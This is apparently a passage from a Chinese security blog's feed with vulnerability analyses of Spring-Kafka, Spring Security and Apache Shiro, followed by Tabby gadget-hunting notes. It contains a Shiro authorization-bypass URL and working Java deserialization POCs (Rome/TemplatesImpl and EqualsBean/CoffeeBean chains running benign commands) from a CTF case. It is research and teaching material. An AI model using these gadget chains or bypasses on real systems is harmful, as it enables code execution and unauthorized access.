<p>但是Consumer收到的Record中的header类型还是<code>RecordHeader</code>，后面用Wireshark抓包看了下，两种header的类型并未在数据包中有体现，数据包中只有header的键值对，换句话说，Consumer收到的Header类型应该不是Producer可控的</p>
<p>后面通过在<code>RecordHeader</code>构造函数设置断点找到了Consumer构造Record的地方：<code>org.apache.kafka.common.record.DefaultRecord#readFrom(java.nio.ByteBuffer, int, int, long, long, int, java.lang.Long)</code></p>
<p>构造header位置：<code>org.apache.kafka.common.record.DefaultRecord#readHeaders</code></p>
<p><img src="/2023/09/28/Spring-Kafka-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2023-34040-%E5%88%86%E6%9E%90/image-20230929001029402.png" alt="image-20230929001029402"></p>
<p>很可惜，从这里代码来看，header只能是<code>RecordHeader</code></p>
<p>详细修复代码见：<a href="https://github.com/spring-projects/spring-kafka/pull/2770/files">https://github.com/spring-projects/spring-kafka/pull/2770/files</a></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://github.com/Contrast-Security-OSS/Spring-Kafka-POC-CVE-2023-34040">https://github.com/Contrast-Security-OSS/Spring-Kafka-POC-CVE-2023-34040</a></p>
]]></content>
      <tags>
        <tag>漏洞分析</tag>
        <tag>Java反序列化漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>Spring Security 权限绕过(CVE-2022-22978)</title>
    <url>/2022/07/16/Spring-Security-%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87-CVE-2022-22978/</url>
    <content><![CDATA[<p>在Java中正则表达式<code>.</code>默认不包含<code>\n</code> 和<code>\r</code>，需要设置<code>DOTALL</code>才会匹配所有字符。而<code>Spring Security</code>在通过正则设置路由权限时，未设置<code>DOTALL</code>，导致某些情况下可以通过<code>\n</code> 和<code>\r</code>来绕过权限控制。</p>
<span id="more"></span>

<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><ul>
<li>Spring Security<ul>
<li>&lt; 5.5.7</li>
<li>&gt;&#x3D; 5.6.0, &lt; 5.6.4</li>
</ul>
</li>
</ul>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/l3yx/vuln-debug.git</span><br><span class="line"><span class="built_in">cd</span> vuln-debug/spring-security/CVE-2022-22978</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>

<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>Spring Security配置如下：</p>
<p><img src="/Spring-Security-%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87-CVE-2022-22978/image-20220716203325350.png" alt="image-20220716203325350"></p>
<p>Controller如下：</p>
<p><img src="/Spring-Security-%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87-CVE-2022-22978/image-20220716213004515.png" alt="image-20220716213004515"></p>
<p>正常访问返回403：</p>
<p><img src="/Spring-Security-%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87-CVE-2022-22978/image-20220716203148959.png" alt="image-20220716203148959"></p>
<p>使用<code>\r</code>或者<code>\n</code>绕过：</p>
<p><img src="/Spring-Security-%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87-CVE-2022-22978/image-20220716203124768.png" alt="image-20220716203124768"></p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>由官方公告<a href="https://spring.io/blog/2022/05/15/cve-2022-22978-authorization-bypass-in-regexrequestmatcher">CVE-2022-22978: Authorization Bypass in RegexRequestMatcher</a>，漏洞和<code>RegexRequestMatcher</code>有关。</p>
<p><img src="/Spring-Security-%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87-CVE-2022-22978/image-20220716183917080.png" alt="image-20220716183917080"></p>
<p>对比漏洞版本5.5.6和已修复版本5.5.7<a href="https://github.com/spring-projects/spring-security/compare/5.5.6..5.5.7">https://github.com/spring-projects/spring-security/compare/5.5.6..5.5.7</a></p>
<p><img src="/Spring-Security-%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87-CVE-2022-22978/image-20220716184215116.png" alt="image-20220716184215116"></p>
<p><img src="/Spring-Security-%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87-CVE-2022-22978/image-20220716184242715.png" alt="image-20220716184242715"></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://github.com/advisories/GHSA-hh32-7344-cg2f">Authorization bypass in Spring Security</a></p>
]]></content>
      <tags>
        <tag>漏洞分析</tag>
        <tag>Spring Security</tag>
      </tags>
  </entry>
  <entry>
    <title>Apache Shiro权限绕过漏洞分析(CVE-2020-11989)</title>
    <url>/2020/06/30/Shiro-%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-CVE-2020-11989/</url>
    <content><![CDATA[<p>Apache Shiro作为常用的Java安全框架，拥有执行身份验证、授权、密码和会话管理等功能，通常会和Spring等框架一起搭配使用来开发Web应用。最近研究Shiro本来是为SCTF出题做准备，但在测试过程中却发现了一些新的缺陷能导致权限绕过，便报告给Apache Shiro官方。玄武实验室安全研究人员也单独发现了<a href="https://xlab.tencent.com/cn/2020/06/30/xlab-20-002/">另外一种绕过方式</a>。</p>
<span id="more"></span>

<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><ul>
<li>Apache Shiro &lt; 1.5.3</li>
<li>Spring框架中使用Shiro鉴权</li>
</ul>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>测试Demo： <a href="https://github.com/l3yx/springboot-shiro">https://github.com/l3yx/springboot-shiro</a></p>
<p>权限配置如下，其中&#x2F;admin下的路由需要登录才能访问</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line">ShiroFilterFactoryBean <span class="title function_">shiroFilterFactoryBean</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">ShiroFilterFactoryBean</span> <span class="variable">bean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ShiroFilterFactoryBean</span>();</span><br><span class="line">    bean.setSecurityManager(securityManager());</span><br><span class="line">    bean.setLoginUrl(<span class="string">&quot;/login&quot;</span>);</span><br><span class="line">    bean.setSuccessUrl(<span class="string">&quot;/index&quot;</span>);</span><br><span class="line">    bean.setUnauthorizedUrl(<span class="string">&quot;/unauthorizedurl&quot;</span>);</span><br><span class="line">    Map&lt;String, String&gt; map = <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>&lt;&gt;();</span><br><span class="line">    map.put(<span class="string">&quot;/doLogin&quot;</span>, <span class="string">&quot;anon&quot;</span>);</span><br><span class="line">    map.put(<span class="string">&quot;/admin/*&quot;</span>, <span class="string">&quot;authc&quot;</span>);</span><br><span class="line">    bean.setFilterChainDefinitionMap(map);</span><br><span class="line">    <span class="keyword">return</span>  bean;</span><br><span class="line">&#125;</span><br><span class="line">---</span><br><span class="line"><span class="meta">@GetMapping(&quot;/admin/page&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">admin</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;admin page&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>maven打包项目为test.war，部署于Tomcat。该漏洞成功利用存在下面两个条件</p>
<ol>
<li>应用不能部署在根目录，也就是需要context-path，server.servlet.context-path&#x3D;&#x2F;test，如果为根目录则context-path为空，就会被CVE-2020-1957的patch将URL格式化，值得注意的是若Shiro版本小于1.5.2的话那么该条件就不需要。</li>
<li>Spring控制器中没有另外的权限校验代码</li>
</ol>
<p>如果直接访问 <code>/test/admin/page</code> ，会返回302跳转要求登录</p>
<p><img src="/Shiro-%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-CVE-2020-11989/image-20200628233813192.png" alt="image-20200628233813192"></p>
<p>但是访问 <code>/;/test/admin/page</code> , 就能直接绕过Shiro权限验证，访问到&#x2F;admin路由中的信息</p>
<p><img src="/Shiro-%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-CVE-2020-11989/image-20200628234200852.png" alt="image-20200628234200852"></p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>由于Shiro的权限校验是通过判断url匹配来做的，如果能找到Shiro获取的url与Web框架处理url不一致的情况就能造成权限绕过。Shiro中对于URL的获取及匹配在org.apache.shiro.web.filter.mgt.PathMatchingFilterChainResolver#getChain</p>
<p>以访问<code>/;/test/admin/page</code>举例，通过getPathWithinApplication函数得到的路径为<code>/</code></p>
<p><img src="/Shiro-%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-CVE-2020-11989/image-20200629000331817.png" alt="image-20200629000331817"></p>
<p>跟入该函数的处理逻辑</p>
<p>org.apache.shiro.web.util.WebUtils#getPathWithinApplication</p>
<p><img src="/Shiro-%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-CVE-2020-11989/image-20200629002023207.png" alt="image-20200629002023207"></p>
<p>可以看到 org.apache.shiro.web.util.WebUtils#getRequestUri 获取到的是<code>/</code></p>
<p><img src="/Shiro-%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-CVE-2020-11989/image-20200629002427590.png" alt="image-20200629002427590"></p>
<p>这里分别通过<code>getContextPath()</code> <code>getServletPath()</code> <code>getPathInfo()</code>获取并拼接得到<code>/;/test//admin/page</code>，传入后decodeAndCleanUriString变成了<code>/</code>,</p>
<p>org.apache.shiro.web.util.WebUtils#decodeAndCleanUriString</p>
<p><img src="/Shiro-%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-CVE-2020-11989/image-20200629002813245.png" alt="image-20200629002813245"></p>
<p>在decodeAndCleanUriString，会根据ascii为59的字符也就是<code>;</code>进行URL的截断，所以最终返回了<code>/</code></p>
<p>回到最开始的<code>/;/test/admin/page</code>请求，该request请求会进入spring中，spring处理url函数如下</p>
<p>org.springframework.web.util.UrlPathHelper#getPathWithinServletMapping</p>
<p><img src="/Shiro-%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-CVE-2020-11989/image-20200629000952659.png" alt="image-20200629000952659"></p>
<p><img src="/Shiro-%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-CVE-2020-11989/image-20200629001017255.png" alt="image-20200629001017255"></p>
<p>在getPathWithinApplication处理下是能正确获取到context-path与路由，最终经过getPathWithinServletMapping函数格式化处理后，得到最终路径为<code>/admin/page</code>，所以我们可以正常访问到该页面<br><img src="/Shiro-%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-CVE-2020-11989/image-20200628234200852.png" alt="image-20200628234200852"><br>因此总结来说就是当URL进入到Tomcat时，Tomcat判断<code>/;test/admin/page</code> 为test应用下的&#x2F;admin&#x2F;page路由，进入到Shiro时被<code>;</code>截断被认作为<code>/</code>,再进入Spring时又被正确处理为test应用下的&#x2F;admin&#x2F;page路由，最后导致shiro的权限绕过。</p>
<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>Shiro 1.5.3修改了URL获取的逻辑，不单独处理context-path，具体代码如下所示<br>org.apache.shiro.web.util.WebUtils#getPathWithinApplication</p>
<p><img src="/Shiro-%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-CVE-2020-11989/image-20200629005615074.png" alt="image-20200629005615074"><br>因此就无法再通过构造context-path的方式来进行绕过了。</p>
<h2 id="处理时间线"><a href="#处理时间线" class="headerlink" title="处理时间线"></a>处理时间线</h2><ul>
<li>2020-6-18 16:30 边界无限安全研究员淚笑向 Apache Shiro 官方报告漏洞</li>
<li>2020-6-19 00:04 Apache Shiro 开始处理漏洞，issue为SHIRO-782</li>
<li>2020-6-22 22:49 Apache Shiro 发布致谢</li>
</ul>
]]></content>
      <tags>
        <tag>Shiro</tag>
      </tags>
  </entry>
  <entry>
    <title>Tabby学习笔记 &amp; Java反序列化gadget分析</title>
    <url>/2023/05/20/Tabby%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96gadget%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>Tabby学习笔记，挖掘反序列化gadget的思路和一些链的详细分析及POC</p>
<span id="more"></span>

<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="Neo4j"><a href="#Neo4j" class="headerlink" title="Neo4j"></a>Neo4j</h3><p>Tabby需要用到Neo4j，项目中有相应的Dockerfile，直接启动，7474为Web端口</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/wh1t3p1g/tabby.git</span><br><span class="line">cd tabby/env</span><br><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure>

<p>检查环境和插件是否成功加载</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CALL apoc.help(&#x27;all&#x27;)</span><br><span class="line">CALL tabby.help(&#x27;all&#x27;)</span><br></pre></td></tr></table></figure>

<p><img src="/2023/05/20/Tabby%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96gadget%E5%88%86%E6%9E%90/image-20230520230016662.png" alt="image-20230520230016662"></p>
<h3 id="Tabby"><a href="#Tabby" class="headerlink" title="Tabby"></a>Tabby</h3><p><a href="https://github.com/wh1t3p1g/tabby/issues/20#issuecomment-960531316">Java版本建议和作者一致或略高</a>，Tabby使用的构建工具是Gradle，可以通过<code>./gradlew tasks</code>查看当前工程中可使用的任务</p>
<p>使用<code>./gradlew bootJar</code>编译打包，编译好的Jar包在<code>build/libs</code>目录</p>
<p>Tabby 1.1.0 版本以后使用配置文件的方式来进行分析，将<code>tabby.jar</code>放到项目根目录，并按需修改<code>config/settings.properties</code>中的<a href="https://github.com/wh1t3p1g/tabby/blob/master/doc/Tabby%20%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%BB%8B%E7%BB%8D.md">配置</a>，因为我的Neo4j是Docker启动的，配置中<code>tabby.cache.isDockerImportPath</code>需要设置为<code>true</code></p>
<p>配置设置好后，运行<code>java -Xmx10g -jar tabby.jar</code>或者<code>./run.sh</code>，内存大小根据实际情况进行调整</p>
<h2 id="案例分析"><a href="#案例分析" class="headerlink" title="案例分析"></a>案例分析</h2><h3 id="2022-长城杯-b4bycoffee"><a href="#2022-长城杯-b4bycoffee" class="headerlink" title="2022 长城杯 b4bycoffee"></a>2022 长城杯 b4bycoffee</h3><p>Jar包下载：<a href="https://share.weiyun.com/kkQkgmVZ">https://share.weiyun.com/kkQkgmVZ</a></p>
<p>备用：<a href="/resource/b4bycoffee_f18028284cae793d0b1da80146f01bd0.zip">b4bycoffee_f18028284cae793d0b1da80146f01bd0.zip</a></p>
<p>反编译分析源码，存在反序列化入口和Rome依赖：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">coffeeController</span> &#123;</span><br><span class="line">  <span class="meta">@RequestMapping(&#123;&quot;/b4by/coffee&quot;&#125;)</span></span><br><span class="line">  <span class="keyword">public</span> Message <span class="title function_">order</span><span class="params">(<span class="meta">@RequestBody</span> CoffeeRequest coffee)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (coffee.Venti != <span class="literal">null</span>) &#123;</span><br><span class="line">      <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(Base64.getDecoder().decode(coffee.Venti));</span><br><span class="line">      <span class="type">AntObjectInputStream</span> <span class="variable">antInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AntObjectInputStream</span>(inputStream);</span><br><span class="line">      <span class="type">Venti</span> <span class="variable">venti</span> <span class="operator">=</span> (Venti)antInputStream.readObject();</span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.rometools<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>rome<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.7.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>但是有以下黑名单：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AntObjectInputStream</span> <span class="keyword">extends</span> <span class="title class_">ObjectInputStream</span> &#123;</span><br><span class="line">  <span class="keyword">private</span> List&lt;String&gt; list;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="title function_">AntObjectInputStream</span><span class="params">(InputStream inputStream)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="built_in">super</span>(inputStream);</span><br><span class="line">    <span class="built_in">this</span>.list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="built_in">this</span>.list.add(BadAttributeValueExpException.class.getName());</span><br><span class="line">    <span class="built_in">this</span>.list.add(ObjectBean.class.getName());</span><br><span class="line">    <span class="built_in">this</span>.list.add(ToStringBean.class.getName());</span><br><span class="line">    <span class="built_in">this</span>.list.add(TemplatesImpl.class.getName());</span><br><span class="line">    <span class="built_in">this</span>.list.add(Runtime.class.getName());</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc) <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.list.contains(desc.getName()))</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidClassException</span>(<span class="string">&quot;Unauthorized deserialization attempt&quot;</span>, desc</span><br><span class="line">          </span><br><span class="line">          .getName()); </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">super</span>.resolveClass(desc);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="Rome"><a href="#Rome" class="headerlink" title="Rome"></a>Rome</h4><p>一般Rome利用链构造如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();</span><br><span class="line">Tool.setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,Tool.getTemplatesImplCMDByteCodes(<span class="string">&quot;open -a calculator&quot;</span>));</span><br><span class="line">Tool.setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;x&quot;</span>);</span><br><span class="line">Tool.setFieldValue(templates,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">Tool.setFieldValue(templates,<span class="string">&quot;_class&quot;</span>,<span class="literal">null</span>);</span><br><span class="line"><span class="comment">//templates.getOutputProperties();</span></span><br><span class="line"></span><br><span class="line"><span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span>  <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class,templates);</span><br><span class="line"><span class="comment">//toStringBean.toString();</span></span><br><span class="line"></span><br><span class="line"><span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class,toStringBean);</span><br><span class="line"><span class="comment">//equalsBean.hashCode();</span></span><br><span class="line"></span><br><span class="line">HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Object,Object&gt;();</span><br><span class="line">hashMap.put(equalsBean, <span class="string">&quot;x&quot;</span>);</span><br><span class="line">Tool.setFieldValue(templates,<span class="string">&quot;_class&quot;</span>,<span class="literal">null</span>);    <span class="comment">//这里必须将_class设置为null，否则在反序列化hashMap的时候会ClassNotFoundException。因为在HashMap.put的时候TemplatesImpl.getOutputProperties()已经被触发一次了，_class中将会存储_bytecodes defineClass后的类</span></span><br><span class="line"><span class="comment">//deserialize hashMap</span></span><br><span class="line"></span><br><span class="line"><span class="type">byte</span>[]  poc = Tool.serialize(hashMap);</span><br></pre></td></tr></table></figure>

<p>调用栈：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">getOutputProperties(), TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">toString(String), ToStringBean (com.sun.syndication.feed.impl)</span><br><span class="line">toString(), ToStringBean (com.sun.syndication.feed.impl)</span><br><span class="line">beanHashCode(), EqualsBean (com.sun.syndication.feed.impl)</span><br><span class="line">hashCode(), EqualsBean (com.sun.syndication.feed.impl)</span><br><span class="line">hash(Object), HashMap (java.util)</span><br><span class="line">readObject(ObjectInputStream), HashMap (java.util)</span><br></pre></td></tr></table></figure>





<p>其中<code>TemplatesImpl</code>和<code>ToStringBean</code>被黑名单禁止了，但是<code>EqualsBean</code>可以用，并且代码中<code>CoffeeBean</code>类的<code>toString</code>方法可以执行任意代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CoffeeBean</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;Coffee bean&quot;</span>;  </span><br><span class="line">  <span class="keyword">private</span> <span class="type">byte</span>[] ClassByte;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">    com.example.b4bycoffee.model.<span class="type">CoffeeBean</span> <span class="variable">coffeeBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">com</span>.example.b4bycoffee.model.CoffeeBean();</span><br><span class="line">    <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> coffeeBean.defineClass((String)<span class="literal">null</span>, <span class="built_in">this</span>.ClassByte, <span class="number">0</span>, <span class="built_in">this</span>.ClassByte.length);</span><br><span class="line">    <span class="type">Object</span> <span class="variable">var3</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      var3 = clazz.newInstance();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InstantiationException var5) &#123;</span><br><span class="line">      var5.printStackTrace();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalAccessException var6) &#123;</span><br><span class="line">      var6.printStackTrace();</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;A cup of Coffee --&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>那么很容易构造出POC：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">CoffeeBean</span> <span class="variable">coffeeBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CoffeeBean</span>();</span><br><span class="line">Tool.setFieldValue(coffeeBean,<span class="string">&quot;ClassByte&quot;</span>,Tool.getCMDByteCodes(<span class="string">&quot;touch /tmp/success&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(CoffeeBean.class,coffeeBean);</span><br><span class="line"></span><br><span class="line">HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Object,Object&gt;();</span><br><span class="line">hashMap.put(equalsBean, <span class="string">&quot;x&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> Tool.encodeBase64(Tool.serialize(hashMap));</span><br></pre></td></tr></table></figure>

<p>调用栈为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">toString(), CoffeeBean (com.example.b4bycoffee.model)</span><br><span class="line">beanHashCode(), EqualsBean (com.rometools.rome.feed.impl)</span><br><span class="line">hashCode(), EqualsBean (com.rometools.rome.feed.impl)</span><br><span class="line">hash(Object), HashMap (java.util)</span><br><span class="line">readObject(ObjectInputStream), HashMap (java.util)</span><br></pre></td></tr></table></figure>





<h4 id="通过Tabby寻找其他链"><a href="#通过Tabby寻找其他链" class="headerlink" title="通过Tabby寻找其他链"></a>通过Tabby寻找其他链</h4><p>修改配置文件，并运行<code>java -Xmx10g -jar tabby.jar</code></p>
<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="attr">tabby.cache.isDockerImportPath</span>            = <span class="string">true</span></span><br><span class="line"><span class="attr">tabby.output.directory</span>                    = <span class="string">env/import</span></span><br><span class="line"></span><br><span class="line"><span class="attr">tabby.build.target</span>                        = <span class="string">cases/b4bycoffee-0.0.1-SNAPSHOT.jar</span></span><br><span class="line"><span class="attr">tabby.build.mode</span>                          = <span class="string">gadget</span></span><br><span class="line"></span><br><span class="line"><span class="attr">tabby.build.isJDKProcess</span>                  = <span class="string">true</span></span><br><span class="line"><span class="attr">tabby.build.enable</span>                        = <span class="string">true</span></span><br><span class="line"><span class="attr">tabby.load.enable</span>                         = <span class="string">true</span></span><br></pre></td></tr></table></figure>

<h5 id="Case1-HashMap-HotSwappableTargetSource-equals-XString-equals-toString"><a href="#Case1-HashMap-HotSwappableTargetSource-equals-XString-equals-toString" class="headerlink" title="Case1 (HashMap -&gt; HotSwappableTargetSource.equals -&gt; XString.equals -&gt; .toString)"></a>Case1 (HashMap -&gt; HotSwappableTargetSource.equals -&gt; XString.equals -&gt; .toString)</h5><p>根据<a href="https://github.com/wh1t3p1g/tabby-path-finder">https://github.com/wh1t3p1g/tabby-path-finder</a>中的示例写出查询语句，先限定source的classname为HashMap以缩小范围：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">match (source:Method &#123;NAME:&quot;readObject&quot;,CLASSNAME:&quot;java.util.HashMap&quot;&#125;)</span><br><span class="line">match (sink:Method &#123;NAME0:&quot;com.example.b4bycoffee.model.CoffeeBean.toString&quot;&#125;)</span><br><span class="line">with source, collect(sink) as sinks</span><br><span class="line">call tabby.algo.findJavaGadget(source, sinks, 8, false, false) yield path</span><br><span class="line">return path limit 1</span><br></pre></td></tr></table></figure>

<p>再根据结果排除一些误报：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">match (source:Method &#123;NAME:&quot;readObject&quot;,CLASSNAME:&quot;java.util.HashMap&quot;&#125;)</span><br><span class="line">match (sink:Method &#123;NAME0:&quot;com.example.b4bycoffee.model.CoffeeBean.toString&quot;&#125;)</span><br><span class="line">with source, collect(sink) as sinks</span><br><span class="line">call tabby.algo.findJavaGadget(source, sinks, 8, false, false) yield path</span><br><span class="line">where none(n in nodes(path) where </span><br><span class="line">    n.NAME0 in [&quot;com.sun.xml.internal.ws.api.BindingID.equals&quot;,&quot;org.yaml.snakeyaml.events.Event.equals&quot;,&quot;com.sun.corba.se.spi.orb.OperationFactory$OperationBase.equals&quot;,&quot;org.springframework.cache.interceptor.CacheOperation.equals&quot;,&quot;javax.swing.text.html.HTML$UnknownTag.equals&quot;]</span><br><span class="line">)</span><br><span class="line">return path limit 1</span><br></pre></td></tr></table></figure>

<p>可以得到如下路径：</p>
<p><img src="/2023/05/20/Tabby%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96gadget%E5%88%86%E6%9E%90/image-20230526013111136.png" alt="image-20230526013111136"></p>
<p>调用栈为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">com.example.b4bycoffee.model.CoffeeBean#toString()</span><br><span class="line">java.lang.Object#toString()</span><br><span class="line">com.sun.org.apache.xpath.internal.objects.XString#equals(java.lang.Object)</span><br><span class="line">java.lang.Object#equals(java.lang.Object)</span><br><span class="line">java.util.HashMap#putVal(int,java.lang.Object,java.lang.Object,boolean,boolean)</span><br><span class="line">java.util.HashMap#readObject(java.io.ObjectInputStream)</span><br></pre></td></tr></table></figure>

<p>如果可行的话，那么POC应该这样构造：</p>
